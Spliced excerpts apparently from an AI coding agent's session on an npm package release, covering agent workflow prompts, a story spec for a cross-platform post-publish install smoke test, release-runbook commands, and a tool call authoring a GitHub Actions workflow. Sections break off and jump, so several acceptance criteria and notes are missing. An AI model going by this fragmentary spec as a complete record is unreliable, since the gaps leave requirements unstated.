1	# Dev Story Workflow
2	
3	**Goal:** Execute story implementation following a context filled story spec file.
4	
5	**Your Role:** Developer implementing the story.
6	- Communicate all responses in {communication_language} and language MUST be tailored to {user_skill_level}
7	- Generate all documents in {document_output_language}
8	- Only modify the story file in these areas: Tasks/Subtasks checkboxes, Dev Agent Record (Debug Log, Completion Notes), File List, Change Log, and Status
9	- Execute ALL steps in exact order; do NOT skip steps
10	- Absolutely DO NOT stop because of "milestones", "significant progress", or "session boundaries". Continue in a single execution until the story is COMPLETE (all ACs satisfied and all tasks/subtasks checked) UNLESS a HALT condition is triggered or the USER gives other instruction.
11	- Do NOT schedule a "next session" or request review pauses unless a HALT condition applies. Only Step 6 decides completion.
12	- User skill level ({user_skill_level}) affects conversation style ONLY, not code updates.

Story 5.4 is being authored `2026-04-24`, i.e. **after** the NFR9 1-hour target. This does NOT cancel the verification — the cross-platform smoke test is still the required v1.0.0 launch gate and feeds the same audit artifact — but the elapsed-time record will document a missed 1-hour target. Story 5.3 promoted to `v1.0.0` under `--tag latest` and activated NFR6 immutability. Story 5.4 (this story) runs the cross-platform post-publish smoke test satisfying NFR9. Once Story 5.4 closes with PASS, Epic 5 reaches `done` and Epic 6 cleanup (6-1 / 6-2 / 6-3) is unblocked.
12	
13	## Story
14	
15	As the maintainer (and on behalf of downstream users),
16	I want `v1.0.0` install verified across the supported platform matrix via the published npm tarball,
17	so that any platform-specific regression is caught and classified (blocking vs non-blocking) with enough lead-time to issue `npm deprecate` + ship `v1.0.1` while the blast radius remains small.
18	
19	## Acceptance Criteria
20	
21	1. **Scope envelope — two commits total in the happy path.** (a) **Commit 1: post-publish smoke-test workflow + NFR9 cross-reference.** Subject `feat(release): add post-publish install smoke workflow (Story 5.4)`. Touches EXACTLY two files: `.github/workflows/install-smoke.yaml` (NEW file — permanent reusable dispatch workflow per AC 3) AND `docs/RELEASING.md` (MODIFIED — append an NFR9 cross-reference block to the `### Cutting v1.0.0 under --tag latest` section authored by Story 5.3, linking the smoke workflow as the post-publish verification step; per `deferred-work.md § S53-D6`). (b) **Commit 2: verification transcripts + audit sign-off.** Subject `docs(release): record cross-platform v1.0.0 install verification (Story 5.4)`. Touches EXACTLY one file: `release-audits/v1.0.0-launch-audit.md` (append `## Story 5.4 Post-Publish Verification` H2 at EOF; update the top-level `## Sign-off` block to append a third sentence per AC 9). **Verification:** `git log main --grep='Story 5.4' --oneline` returns both commit subjects; `git log main --grep='install-smoke.yaml' --name-only` returns a single `A .github/workflows/install-smoke.yaml` addition.
22	
23	2. **NFR9 clock-window documentation — record the actual elapsed time from publish to verification.** The target is 60 min (`2026-04-23T18:56:39Z` publish → `2026-04-23T19:56:39Z` deadline). Story 5.4 is authored 2026-04-24 (post-deadline). The audit artifact (AC 8 subsection `### NFR9 elapsed-time record`) SHALL compute the wall-clock delta from publish to smoke-workflow completion (in hours:minutes), classify the NFR9 status as one of `within-window | missed-target-non-blocking | missed-target-with-live-defect` per AC 7 triage outcome, and record the actual timestamps. A missed NFR9 window when no live cross-platform defect was present is **non-blocking** for Epic 5 closure (the policy's safety goal — catching a defect fast while blast radius is small — is achieved in practice, just later than the 1-hour target). This disposition SHALL be explicit in the audit so the Epic 5 retrospective can weigh whether the 1-hour target needs softening, automation (e.g., post-publish workflow auto-triggered by tag push), or staffing commitments.
24	
25	3. **`.github/workflows/install-smoke.yaml` — new permanent workflow authored in Commit 1.** Shape SHALL be:
26	   - `name: Install Smoke Test`
27	   - `on: workflow_dispatch` with a `version` input (string, default `"latest"`, description pointing at npm dist-tags like `latest`/`rc`/`alpha` or explicit versions like `1.0.0`)
28	   - `permissions: { contents: read }` (no write — smoke test only fetches from npm)
29	   - Single job `smoke` with matrix strategy `{ os: [ubuntu-latest, windows-latest, macos-latest], fail-fast: false }`
30	   - `runs-on: ${{ matrix.os }}`
31	   - Steps: (i) `actions/setup-node@v4` with `node-version: '22'` (matching `.nvmrc`; no checkout needed — the smoke test is against the published npm package, not the repo source), (ii) `npx --yes bmad-module-skill-forge@${{ inputs.version }} --version` with explicit `if-no-files-found`/`exit 0` assertion in a shell-portable one-liner
32	   - NO additional steps (`install` subcommand is interactive-only per Story 5.2 AC 9 deviation note — issue #211; `status` requires prior install state so is not CI-runnable without first driving the interactive install). `--version` is the maximum-portable smoke check: it validates the tarball resolves, the `bin` wrapper (`tools/skf-npx-wrapper.js`) executes, commander dispatch reaches `tools/cli/skf-cli.js`, and the version string from `package.json` is readable and printed — the common cross-platform regression vectors (tarball corruption, shebang issues, platform-specific bin wrapper bugs, filesystem case-sensitivity).
33	   - **Adding macOS to the matrix goes BEYOND NFR9's "manual spot-check" — NFR9 allows manual macOS but doesn't forbid CI automation.** Including `macos-latest` converts the manual-spot-check obligation into a reproducible CI artifact and reduces the maintenance burden for every future release. The matrix triplet `[ubuntu-latest, windows-latest, macos-latest]` matches the npm public-repo Actions free-tier coverage and the `Dev Notes § (C)` rationale.
34	
35	4. **Ubuntu smoke test run — first mandatory dispatch.** After Commit 1 lands on `main`: dispatch `install-smoke.yaml` with `version: latest`. The ubuntu-latest job SHALL:
36	   - Resolve `npx --yes bmad-module-skill-forge@latest` to `1.0.0` (observable in the Actions log; the `--yes` flag suppresses the interactive confirm for first-install of a package)
37	   - Print `1.0.0` to stdout (the declared version in `package.json.version`)
38	   - Exit `0` (no stderr noise, no permission errors, no shebang failures)
39	   - Complete in under 60 seconds typical wall-clock
40	   
41	   **Blocker criterion:** if the ubuntu job fails, HALT Commit 2 — capture the failing-step log, triage per AC 7, decide blocking vs non-blocking. A ubuntu failure is a CRITICAL blocker (majority of downstream installs are Linux) and triggers the Epic 4 Rollback Playbook Scenario B (`npm deprecate v1.0.0 "<reason>"` + prepare v1.0.1).
42	
43	5. **Windows smoke test run — same dispatch, matrix sibling.** The windows-latest job of the same dispatch SHALL meet the same success criteria as AC 4. Windows is the #1 platform-divergence risk surface for SKF per `quality.yaml:76-78` comment (path handling, line endings, shell scripts) — any failure here is likely to expose a latent Windows bug in the bin wrapper or commander dispatch. Blocker criterion: same as AC 4 (Windows install failure → HALT Commit 2, triage, likely Scenario B rollback).
44	
45	6. **macOS smoke test run — same dispatch, matrix sibling (CI-automated coverage of NFR9's manual-spot-check obligation).** The macos-latest job of the same dispatch SHALL meet the same success criteria as AC 4 & AC 5. **NFR9 allows manual spot-check for macOS; Story 5.4 elects to include macOS in the CI matrix instead.** This elevates the spot-check guarantee from "best-effort maintainer run" to "CI-reproducible artifact." **Fallback:** if `macos-latest` becomes unavailable or costs increase, the job can be moved to manual spot-check per NFR9's text; this falls back safely without violating the NFR. Blocker criterion: macOS failure is a BLOCKING HIGH (smaller macOS user base but a silent macOS regression would be a bad launch story). Triage per AC 7.
46	
47	7. **Triage protocol for any failure — blocking vs non-blocking classification.** If any matrix leg of the smoke workflow fails:
48	   - (a) Capture the failing step, full log, and `package.json`/shebang/`bin`-wrapper state from the failure context
49	   - (b) Reproduce locally if possible (maintainer has Linux access — Ubuntu WSL counts; Windows + macOS reproduction is best-effort unless maintainer has hardware)
50	   - (c) Classify:
51	     - **BLOCKING:** install cannot complete on a supported platform at all (exit !=0 for `--version`, tarball corrupt, bin wrapper missing, shebang platform-incompatible). This triggers `npm deprecate bmad-module-skill-forge@1.0.0 "<specific reason>"` IMMEDIATELY per `docs/RELEASING.md § Rollback Playbook § Scenario B`, followed by `release.yaml -f version_bump=patch` to cut `v1.0.1` with the platform fix. Epic 5 does NOT close until `v1.0.1` ships clean.
52	     - **NON-BLOCKING:** install succeeds but a cosmetic/warning artifact appears (stderr noise, deprecation warnings from a transitive dep, slower-than-typical resolution). Record in Commit 2's audit artifact as "NFR9 PASS with observations"; do NOT trigger deprecate.
53	   - (d) If BLOCKING, file a same-repo GitHub issue titled `v1.0.0 install regression: <platform> <one-line>`. No `_bmad-output/todo/` references. No cross-repo issue refs (per user-memory `feedback_no_issue_numbers_in_pr.md`).
54

57	   - `### Matrix results` — a 3-row table (`ubuntu-latest | windows-latest | macos-latest`) with per-leg: job status (`success`/`failure`), `--version` stdout captured verbatim, exit code, wall-clock per leg, runner image SHA if surfaced in log

161	
162	## Dev Notes
163	
164	### What this story actually is
165	
166	A **post-publish cross-platform smoke test** that satisfies NFR9 by dispatching a new reusable `install-smoke.yaml` workflow on ubuntu+windows+macos, capturing matrix outputs as verification evidence, and signing off the v1.0.0 launch audit. The story authors **one new permanent workflow** (reusable for every future release) and **two commits** (the workflow + RELEASING cross-reference, then the verification transcripts). No repo-source code changes.
167	
168	**What this story is NOT:**
169	
170	- NOT a full interactive install verification — the `install` subcommand's multiselect IDE prompt cannot be driven by piped stdin (issue #211); CI smoke tests only the `--version` path. Full interactive install + `status` + `uninstall` were validated by Story 5.2 rc.3 on Linux; Windows + macOS interactive spot-checks remain maintainer-optional.
171	- NOT a deprecate or unpublish of v1.0.0 — regardless of any blocking regression discovered, NFR6 forbids unpublish; Scenario B (deprecate + ship v1.0.1) is the only rollback path.
172	- NOT a code change in `tools/` / `src/` / `test/` / `docs/STABILITY.md` — v1.0.0 is the artifact under verification, not under amendment.
173	- NOT an edit to `release.yaml` — the canonical release workflow is untouched; only `install-smoke.yaml` (new) and `docs/RELEASING.md` (NFR9 cross-reference append) change in Commit 1.
174	- NOT an `npm view`-based attestation re-audit — that was Story 5.3's AC 6 territory; Story 5.4 assumes attestation state as established.
175	- NOT a release-workflow re-run — no `release.yaml` dispatch happens in Story 5.4; the `install-smoke.yaml` dispatch is the ONLY workflow action.
176	- NOT a CHANGELOG edit — Story 5.3 reconciled CHANGELOG; Story 5.4 touches only the audit artifact for sign-off.
177	
178	### Load-bearing decisions already made at create-story (no Dev-Agent re-derivation needed)
179	
180	**(A) Three-platform CI matrix for smoke, not two + manual.** NFR9 reads "Linux + Windows via quality.yaml matrix within 1 hour post-publish; macOS SHALL be spot-checked manually." We elect to include `macos-latest` in the smoke matrix. Rationale: (i) it's free on public repos under the standard Actions runner allocation; (ii) it converts a soft manual-spot-check into a reproducible CI artifact, with the same evidence surface (Actions run URL + logs) as Linux + Windows; (iii) future releases inherit automatic macOS coverage without requiring maintainer hardware availability; (iv) NFR9 permits this (explicit allowance of manual doesn't forbid automation). Fallback if `macos-latest` becomes scarce or costs change post-v1: remove from matrix, revert to manual per NFR9 literal.
181	
182	**(B) NFR9 1-hour window was missed at create-story time.** Story 5.3 published at `2026-04-23T18:56:39Z`; the 1-hour NFR9 window closed at `2026-04-23T19:56:39Z`. Story 5.4 is authored `2026-04-24` — well past the deadline. The story proceeds with the full verification regardless: the purpose of NFR9 (catch cross-platform regressions while blast radius is small) is still served by running the smoke test as soon as practical. The audit (AC 8 `### NFR9 elapsed-time record`) SHALL document the actual elapsed time and classify the miss per AC 2. This is the FIRST NFR9 data point; Epic 5 retrospective will decide whether to: (i) keep the 1-hour target and add automation to trigger smoke on tag-push (converting NFR9 to a near-real-time auto-verification); (ii) soften the target to 24 hours for solo-maintainer operability; (iii) leave the target and commit to on-call staffing for future launches. None of those is a Story 5.4 decision — Story 5.4 records the miss and lets the retro decide policy.
183	
184	**(C) `--version` is the maximum-portable smoke check.** The full CLI surface exposes `install` (interactive, multiselect-required, not pipe-able per Story 5.2 rc.3), `status` (non-interactive but requires prior install state — would fail in a clean CI runner), `uninstall` (pipe-able via `printf 'y\n'` but same prior-install dependency as `status`), `update` (interactive, same pipe-ability issues as install), and `--version` / `--help` (non-interactive, no dependencies, maximally portable). `--version` is chosen over `--help` because it asserts that `package.json.version` is correctly readable at runtime (touches the bin wrapper → commander → version-flag wiring) — `--help` would only exercise commander's help registry without touching version-read. For every platform the smoke runs on, a successful `--version` proves: (i) npm tarball resolves and extracts cleanly; (ii) `bin` wrapper (`tools/skf-npx-wrapper.js`) is executable with the correct shebang for the platform; (iii) Node can load and execute the CLI entrypoint; (iv) commander dispatch is functional; (v) `package.json` is readable at runtime. This covers every common cross-platform regression vector without requiring TTY simulation.
185	
186	**(D) Two-commit envelope over single-commit.** A single-commit envelope (workflow + audit append together) would leave the smoke-workflow's dispatch unobserved at commit time — the audit transcript would be authored before the workflow runs. Two commits enforce temporal ordering: (i) Commit 1 lands the workflow, (ii) a fresh dispatch captures ground-truth matrix evidence, (iii) Commit 2 records that evidence. This matches Story 5.2 & 5.3's two-commit patterns and makes the audit authentically post-evidence.
187	
188	**(E) No repo checkout in the smoke workflow.** The smoke test runs against the PUBLISHED npm tarball, not the repo source. Checking out `main` would pollute the runner with repo files and delay each job by ~5-10s (clone + cache restore). Using `actions/setup-node@v4` with explicit `node-version: '22'` (hardcoded to match `.nvmrc`) avoids checkout entirely. Trade-off: if `.nvmrc` ever advances to Node 23+, the smoke workflow's hardcoded `22` becomes stale — a dedicated audit-item to update the workflow in lockstep with any future Node-major bump. Dev-agent adds a comment in the workflow file noting this coupling.
189	
190	**(F) `fail-fast: false` on the matrix.** If ubuntu fails, we still want windows and macos to run so the full matrix picture is visible in one dispatch. `fail-fast: true` would cancel siblings on first failure and force re-dispatch per-platform, adding latency to triage. This mirrors `quality.yaml`'s matrix pattern (`fail-fast: false` at lines 81 and 129).
191	
192	**(G) `permissions: contents: read` is the minimum — no write, no id-token.** The smoke workflow fetches from npm (public), executes node, and exits. It does NOT need `contents: write` (doesn't push), `id-token: write` (doesn't publish), or `packages:` (doesn't read GH Packages). Minimum-privilege per npm trusted-publishing migration ethos (Story 1.3 + 3.1 + NFR7).
193	
194	**(H) `install-smoke.yaml` becomes a permanent reusable artifact.** Every future release cut (`v1.0.1`, `v1.1.0`, `v2.0.0`, …) can redispatch this workflow with the new version tag to produce the same smoke evidence. This is the first durable cross-platform CI artifact in SKF's release infrastructure — prior smoke tests were ad-hoc maintainer runs (Story 5.2 rc.3). Story 5.4 is investing in the tooling, not just running a one-shot check.
195	
196	**(I) NFR6 firewall on ANY smoke failure.** The v1.0.0 version is immutable from `2026-04-23T18:56:39Z` onwards. A smoke failure NEVER justifies `npm unpublish bmad-module-skill-forge@1.0.0` regardless of the npm 72-hour eligibility window. The only forward path is Scenario B: `npm deprecate bmad-module-skill-forge@1.0.0 "<reason>"` + `release.yaml -f version_bump=patch` to cut `v1.0.1`. AC 15 encodes this.
197	
198	**(J) Zero RC-style iteration loop.** Unlike Story 5.2's 7-attempt saga (pipeline defect discovery) and Story 5.3's clean first-attempt success (pipeline E2E-proven), Story 5.4 has ONE dispatch expected: `install-smoke.yaml` with `version: latest`. If that dispatch fails with a BLOCKING defect, the response is Scenario B ship-forward (outside Story 5.4 scope), NOT re-dispatch of the smoke workflow. If it fails with a NON-BLOCKING defect (cosmetic warnings), it still counts as PASS — record observations in audit.
199

249	## Project Structure Notes
250	
251	**Files Story 5.4 modifies (across two commits, three files touched total):**
252	
253	- `.github/workflows/install-smoke.yaml` — NEW in Commit 1. Permanent reusable `workflow_dispatch`-triggered workflow with matrix `ubuntu-latest / windows-latest / macos-latest`; runs `npx --yes bmad-module-skill-forge@<version> --version` on each runner; contents:read permissions only; default version input `latest`. Shape spec in AC 3. Reusable for every future release.

Appends an NFR9 cross-reference `#### Post-publish verification (NFR9)` sub-heading to the `### Cutting v1.0.0 under --tag latest` section (the one Story 5.3 authored). Links to `.github/workflows/install-smoke.yaml` as the canonical post-publish smoke vehicle. Terse — no duplication of content; just the pointer.

Updates the top-level `## Sign-off` block (append one sentence). Net: +60-100 lines depending on matrix-result verbosity (shorter than Story 5.3's section because fewer moving parts).

559	### Cutting v1.0.0 under --tag latest
560	
561	- **Trigger.** The passing RC has survived a clean-environment smoke test (`release-audits/v1.0.0-launch-audit.md § Story 5.2 RC Cut + Smoke Test § Decision: PASS — cleared for Story 5.3 promotion to v1.0.0 under --tag latest with manual approval`); `npm view bmad-module-skill-forge@rc version` returns the passing RC (at Story 5.3 dispatch time: `1.0.0-rc.3`); Story 5.3 is ready to promote to `latest` under manual approval.
562	- **CLI.**
563	
564	  ```bash
565	  git checkout main && git pull
566	
567	  # Pre-dispatch sanity check (read version from remote, not local clone).
568	  gh api repos/armelhbobdad/bmad-module-skill-forge/contents/package.json \
569	    --jq '.content' | base64 -d | jq -r .version
570	  # expected: the passing RC (e.g., 1.0.0-rc.3)
571	
572	  # Dispatch the canonical release workflow. `version_bump: major` on
573	  # 1.0.0-rc.N strips the prerelease suffix and produces 1.0.0 (node-semver
574	  # inc(ver, 'major') behavior on a prerelease). `--ref main` is explicit
575	  # (gh defaults to the repo's default branch, but any non-main ref takes
576	  # the legacy tag-only path inside release.yaml, so pass it defensively).
577	  gh workflow run release.yaml -f version_bump=major --ref main
578	
579	  # Capture the run id for monitoring + audit transcript.
580	  RUN_ID=$(gh run list --workflow=release.yaml --limit 1 \
581	    --json databaseId --jq '.[0].databaseId')
582	  gh run watch $RUN_ID
583	  ```
584	
585	  The workflow pauses at **two** gates that the maintainer must clear in the browser. Gate 1 requires explicit approval; gate 2 accepts either approval or admin-bypass-merge:
586	
587	  1. The `release` environment deployment gate (at job start). Approve via "Review deployments" → "Approve and deploy" on the run page.
588	  2. The bot PR review-decision gate (after the 7 required status checks pass). EITHER approve the bot PR via the review UI, OR admin-bypass-merge via the PR merge button — both paths are accepted by `release.yaml`'s `Wait for PR approval or admin-bypass merge` step. Admin-bypass-merge is the observed pattern for prior cuts (PRs #209 and #213).
589	
590	  Expected wall-clock: ~5–8 minutes end-to-end when both gates are approved promptly.
591	
592	- **Expected outcome.** `main` tip advances by 2 commits (the `release: bump to v1.0.0` commit on the bot temp branch `release/bot/v1.0.0-<run_id>`, plus the merge commit from the auto-merged or admin-bypass-merged bot PR); `jq -r .version package.json` → `1.0.0`; `jq -r '.plugins[0].version' .claude-plugin/marketplace.json` → `1.0.0`; `npm view bmad-module-skill-forge dist-tags.latest` → `1.0.0` (flipped from the prior stable, e.g. `0.10.0`); `rc` dist-tag UNCHANGED at the prior RC; SLSA L2 provenance attached (NFR4); GitHub Release `v1.0.0` with `prerelease: false` (NFR6 threshold — `1.0.0` contains no `alpha|beta|rc` substring); tag `v1.0.0` anchors on the bot PR's merge commit per Story 3.4 P9 (the tag is annotated, so `git rev-parse 'v1.0.0^{}'` gives the commit SHA to compare against `main` tip).
593	
594	- **Constraints.**
595	  - Execute ONLY after the RC audit `§ Sign-off` is populated AND the smoke-test `Decision` is `PASS`.
596	  - The cut is IRREVERSIBLE — once `npm publish --tag latest` succeeds for `1.0.0`, NFR6 forbids unpublish regardless of eligibility window. Rollback is `npm deprecate` + ship-forward (Scenarios A / B).
597	  - The CHANGELOG reconciliation is a POST-workflow step (authored as a separate sign-off commit on `feat/v1-final-signoff`). Do NOT hand-edit the `## [1.0.0] - TBD` placeholder BEFORE dispatch — let the workflow auto-generate its `## [1.0.0]` block (which may be EMPTY when there are zero conventional-commit `feat:` / `fix:` entries between the RC and the final cut, which is the normal case), then merge the hand-curated prose into the auto-gen header's position and delete the stale placeholder in one commit.
598	  - Do NOT pre-bump `package.json` or `.claude-plugin/marketplace.json` — the workflow's `Bump version` and `Update marketplace.json version` steps handle both atomically and own those files.
599	  - If `npm version major` unexpectedly emits `2.0.0` instead of `1.0.0` on `1.0.0-rc.N`, the node-semver engine behavior has regressed. Abort the dispatch and investigate before retry — a workflow override (`npm version 1.0.0 --no-git-tag-version`) would be required in `release.yaml`.
600	
601	- **Verification.**
602	
603	  ```bash
604	  # Confirm the latest dist-tag flipped to 1.0.0.
605	  npm view bmad-module-skill-forge dist-tags --json
606	  # expected: {"latest":"1.0.0","alpha":"...","rc":"1.0.0-rc.N"}
607	
608	  npm view bmad-module-skill-forge@latest version
609	  # expected: 1.0.0
610	
611	  # Confirm SLSA L2 provenance (NFR4 CRITICAL). A null attestation is a
612	  # blocker — emergency-deprecate + cut 1.0.1 with provenance per Scenario B.
613	  npm view bmad-module-skill-forge@1.0.0 --json | jq '.dist.attestations'
614	  # expected: non-null object; .provenance.predicateType starts with
615	  #           "https://slsa.dev/provenance/"
616	
617	  # Confirm the GitHub Release exists and is NOT a prerelease (NFR6 threshold).
618	  gh release view v1.0.0 --json tagName,isPrerelease
619	  # expected: {"tagName":"v1.0.0","isPrerelease":false}
620	
621	  # Confirm the v1.0.0 tag is reachable from main (annotated tag — dereference with ^{}).
622	  # Uses --is-ancestor so the check stays valid after subsequent commits land on main;
623	  # pin to the recorded merge SHA if you need strict tag-anchor equivalence.
624	  git fetch origin --tags
625	  git merge-base --is-ancestor "$(git rev-parse 'v1.0.0^{}')" origin/main && echo OK
626	  # expected: OK
627	
628	  # Confirm CHANGELOG reconciliation after the sign-off commit lands on main.
```

634	  **NFR6 immutability activation** is the `npm publish --tag latest` success timestamp for `1.0.0`, recorded verbatim in `release-audits/v1.0.0-launch-audit.md § Story 5.3 v1.0.0 Final Cut § NFR6 v1.0.0 immutability activation`. For Story 5.3's dispatch, that instant was **2026-04-23T18:56:39Z**. From that moment, `v1.0.0` is forever-burned — `npm deprecate` + ship-forward is the only rollback path.
635	
636	  The `release` environment + bot PR approval-or-admin-bypass-merge pattern is the canonical flow for all main-dispatched cuts since Story 3.4 ([GitHub issue #198](https://github.com/armelhbobdad/bmad-module-skill-forge/issues/198), [PR #199](https://github.com/armelhbobdad/bmad-module-skill-forge/pull/199)): the release commit is pushed to a temp branch `release/bot/vX.Y.Z-<run_id>`, a bot PR is opened against `main`, the 7 required status checks are force-triggered against the temp branch via `workflow_dispatch`, and the merge is gated behind maintainer approval at both the `release` environment gate and the PR review-decision gate. Non-main dispatches (feature-branch alpha cuts) skip the PR dance entirely and keep the legacy tag-only behavior.

```json
{
  "file_path": "/home/armel/Projects/OSS/bmad-module-skill-forge/.github/workflows/install-smoke.yaml",
  "content": "# Post-publish install smoke test (NFR9 cross-platform verification).\n#\n# Purpose: verify a published `bmad-module-skill-forge` version resolves and\n# executes cleanly on ubuntu-latest + windows-latest + macos-latest by running\n# `npx --yes bmad-module-skill-forge@<version> --version` on each runner.\n#\n# Trigger: `workflow_dispatch` — run manually after a release (e.g. `latest`,\n# `rc`, `alpha`, or an explicit version like `1.0.0`). NOT coupled to\n# `release.yaml`; runs against the published npm tarball, not the repo source.\n#\n# Expected use: the maintainer dispatches this workflow within 1 hour after a\n# cut per NFR9; results feed the matching release audit artifact's\n# `## Story <N> Post-Publish Verification § Matrix results` table.\n#\n# Why `--version` and not `install` / `status`: the interactive `install`\n# subcommand multiselect prompt is not pipe-able from CI stdin (issue #211);\n# `status` and `uninstall` depend on prior install state. `--version` is the\n# maximum-portable smoke check — it proves the npm tarball resolves, the\n# `bin` wrapper (`tools/skf-npx-wrapper.js`) is executable with the correct\n# shebang, Node can load the CLI entrypoint, commander dispatch works, and\n# `package.json.version` is readable at runtime. That covers the common\n# cross-platform regression vectors (tarball corruption, shebang issues,\n# bin-wrapper bugs, filesystem case-sensitivity) without TTY simulation.\n#\n# Node version coupling: `node-version: '22'` is hardcoded to match\n# `.nvmrc`. If `.nvmrc` advances to Node 23+, update this workflow in\n# lockstep.\n\nname: Install Smoke Test\n\non:\n  workflow_dispatch:\n    inputs:\n      version:\n        description: \"npm dist-tag (latest / rc / alpha) or explicit version (e.g. 1.0.0)\"\n        required: true\n        type: string\n        default: \"latest\"\n\npermissions:\n  contents: read\n\njobs:\n  smoke:\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, windows-latest, macos-latest]\n    runs-on: ${{ matrix.os }}\n    timeout-minutes: 5\n    steps:\n      - name: Setup Node\n        uses: actions/setup-node@v4\n        with:\n          node-version: \"22\"\n\n      - name: Run npx bmad-module-skill-forge --version\n        shell: bash\n        run: |\n          set -euo pipefail\n          OUTPUT=\"$(npx --yes \"bmad-module-skill-forge@${{ inputs.version }}\" --version)\"\n          echo \"stdout: ${OUTPUT}\"\n          if [ -z \"${OUTPUT}\" ]; then\n            echo \"::error::--version produced empty stdout\"\n            exit 1\n          fi\n"
}
```

  "command": "while true; do\n  OUT=$(gh pr view 219 --json statusCheckRollup --jq '[.statusCheckRollup[] | select(.name | IN(\"prettier\",\"eslint\",\"markdownlint\",\"validate (ubuntu-latest)\",\"validate (windows-latest)\",\"python (ubuntu-latest)\",\"python (windows-latest)\"))]' 2>/dev/null || echo \"[]\")\n  TOTAL=$(echo \"$OUT\" | jq 'length')\n  COMPLETED=$(echo \"$OUT\" | jq '[.[] | select(.status==\"COMPLETED\")] | length')\n  FAILED=$(echo \"$OUT\" | jq -r '[.[] | select(.status==\"COMPLETED\" and .conclusion!=\"SUCCESS\") | .name] | @csv')\n  if [ \"$TOTAL\" -eq 7 ] && [ \"$COMPLETED\" -eq 7 ]; then\n    if [ \"$FAILED\" = '\"\"' ] || [ -z \"$FAILED\" ]; then\n      echo \"ALL_CHECKS_PASSED total=$TOTAL\"\n    else\n      echo \"CHECKS_FAILED failures=$FAILED\"\n    fi\n    break\n  fi\n  echo \"PROGRESS completed=$COMPLETED/$TOTAL\"\n  sleep 30\ndone"

3	---
4	
5	# Code Review Workflow
6	
7	**Goal:** Review code changes adversarially using parallel review layers and structured triage.
8	
9	**Your Role:** You are an elite code reviewer. You gather context, launch parallel adversarial reviews, triage findings with precision, and present actionable results. No noise, no filler.
10	
11	
12	## WORKFLOW ARCHITECTURE
13	
14	This uses **step-file architecture** for disciplined execution:
15	
16	- **Micro-file Design**: Each step is self-contained and followed exactly
17	- **Just-In-Time Loading**: Only load the current step file
18	- **Sequential Enforcement**: Complete steps in order, no skipping
19	- **State Tracking**: Persist progress via in-memory variables
20	- **Append-Only Building**: Build artifacts incrementally
21	
22	### Step Processing Rules
23	
24	1. **READ COMPLETELY**: Read the entire step file before acting
25	2. **FOLLOW SEQUENCE**: Execute sections in order
26	3. **WAIT FOR INPUT**: Halt at checkpoints and wait for human
27	4. **LOAD NEXT**: When directed, read fully and follow the next step file
28	
29	### Critical Rules (NO EXCEPTIONS)
30	
31	- **NEVER** load multiple step files simultaneously
32	- **ALWAYS** read entire step file before execution
33	- **NEVER** skip steps or optimize the sequence
34	- **ALWAYS** follow the exact instructions in the step file
35	- **ALWAYS** halt at checkpoints and wait for human input
36	
37	
38	## INITIALIZATION SEQUENCE
39	
40	### 1. Configuration Loading
41	
42	Load and read full config from `{main_config}` and resolve:
43	
44	- `project_name`, `planning_artifacts`, `implementation_artifacts`, `user_name`
45	- `communication_language`, `document_output_language`, `user_skill_level`
46	- `date` as system-generated current datetime
47	- `sprint_status` = `{implementation_artifacts}/sprint-status.yaml`
48	- `project_context` = `**/project-context.md` (load if exists)
49	- CLAUDE.md / memory files (load if exist)
50	
51	YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`.
52	
53	### 2. First Step Execution
54	
55	Read fully and follow: `./steps/step-01-gather-context.md` to begin the workflow.
56

1	---
2	diff_output: '' # set at runtime
3	spec_file: '' # set at runtime (path or empty)
4	review_mode: '' # set at runtime: "full" or "no-spec"
5	story_key: '' # set at runtime when discovered from sprint status
6	---
7	
8	# Step 1: Gather Context
9	
10	## RULES
11	
12	- YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
13	- The prompt that triggered this workflow IS the intent — not a hint.
14	- Do not modify any files. This step is read-only.
15	
16	## INSTRUCTIONS
17	
18	1. **Find the review target.** The conversation context before this skill was triggered IS your starting point — not a blank slate. Check in this order — stop as soon as the review target is identified:
19	
20	   **Tier 1 — Explicit argument.**
21	   Did the user pass a PR, commit SHA, branch, spec file, or diff source this message?
22	   - PR reference → resolve to branch/commit via `gh pr view`. If resolution fails, ask for a SHA or branch.
23	   - Commit or branch → use directly.
24	   - Spec file → set `{spec_file}` to the provided path. Check its frontmatter for `baseline_commit`. If found, use as diff baseline. If not found, continue the cascade (a spec alone does not identify a diff source).
25	   - Also scan the argument for diff-mode keywords that narrow the scope:
26	     - "staged" / "staged changes" → Staged changes only
27	     - "uncommitted" / "working tree" / "all changes" → Uncommitted changes (staged + unstaged)
28	     - "branch diff" / "vs main" / "against main" / "compared to <branch>" → Branch diff (extract base branch if mentioned)
29	     - "commit range" / "last N commits" / "<from-sha>..<to-sha>" → Specific commit range
30	     - "this diff" / "provided diff" / "paste" → User-provided diff (do not match bare "diff" — it appears in other modes)
31	   - When multiple keywords match, prefer the most specific (e.g., "branch diff" over bare "diff").
32	
33	   **Tier 2 — Recent conversation.**
34	   Do the last few messages reveal what the user wants to be reviewed? Look for spec paths, commit refs, branches, PRs, or descriptions of a change. Apply the same diff-mode keyword scan and routing as Tier 1.
35	
36	   **Tier 3 — Sprint tracking.**
37	   Look for a sprint status file (`*sprint-status*`) in `{implementation_artifacts}` or `{planning_artifacts}`. If found, scan for stories with status `review`:
38	   - **Exactly one `review` story:** Set `{story_key}` to the story's key (e.g., `1-2-user-auth`). Suggest it: "I found story <story-id> in `review` status. Would you like to review its changes? [Y] Yes / [N] No, let me choose". If confirmed, use the story context to determine the diff source (branch name derived from story slug, or uncommitted changes). If declined, clear `{story_key}` and fall through.
39	   - **Multiple `review` stories:** Present them as numbered options alongside a manual choice option. Wait for user selection. If a story is selected, set `{story_key}` and use its context to determine the diff source. If manual choice is selected, clear `{story_key}` and fall through.
40	   - **None:** Fall through.
41	
42	   **Tier 4 — Current git state.**
43	   If version control is unavailable, skip to Tier 5. Otherwise, check the current branch and HEAD. If the branch is not `main` (or the default branch), confirm: "I see HEAD is `<short-sha>` on `<branch>` — do you want to review this branch's changes?" If confirmed, treat as a branch diff against `main`. If declined, fall through.
44	
45	   **Tier 5 — Ask.**
46	   Fall through to instruction 2.
47	
48	   Never ask extra questions beyond what the cascade prescribes. If a tier above already identified the target, skip the remaining tiers and proceed to instruction 3 (construct diff).
49	
50	2. HALT. Ask the user: **What do you want to review?** Present these options:
51	   - **Uncommitted changes** (staged + unstaged)
52	   - **Staged changes only**
53	   - **Branch diff** vs a base branch (ask which base branch)
